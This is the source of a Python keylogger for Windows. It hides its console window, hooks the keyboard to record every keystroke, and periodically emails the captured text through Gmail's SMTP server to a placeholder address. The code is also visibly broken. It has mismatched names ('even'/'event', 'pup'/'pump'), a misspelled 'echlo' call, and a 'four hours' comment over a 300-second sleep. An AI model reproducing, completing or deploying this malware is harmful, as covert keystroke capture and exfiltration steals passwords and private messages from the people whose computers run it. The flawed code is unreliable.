import pyHook
import pythoncom
import win32gui
import win32console

#threads
import threading
import time
import smtplib


email = 'send_info_to'

#list of data
list =[]
#name of file
log_file = "log_file.txt"
window = win32console.GetConsoleWindow()
# hide window
win32gui.ShowWindow(window,0)

#on key pressed function
def pressed_chars(even):
    if event.Ascii:
        f = open(log_file,"a")
        char = chr(event.Ascii)
        list.append(char)
        if char == "q":
                f.close()
                exit()
        # (if char is "return")
        if event.Ascii == 13:
                f.close()
                # f.write("\n")
        f.close()
        # f.write(char)
        
        
# start keylogger, will need thread
def pup():
       #start keylogger
       proc = pyHook.HookManager()
       proc.KeyDown = pressed_chars
       proc.HookKeyboard()
       pythoncom.PumpMessages()
       
def send_email():
        while 1:
                # four hours
                time.sleep(300)
                #gmail server
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.echlo()
                server.login('gmail','pwd')
                msg = ''.join(list)
                server.sendmail('gmail', email, msg)
                
# create threads
w = threading.Thread(target=send_email)
w2 = threading.Thread(target=pump)


# start thread
w.start()
w2.start()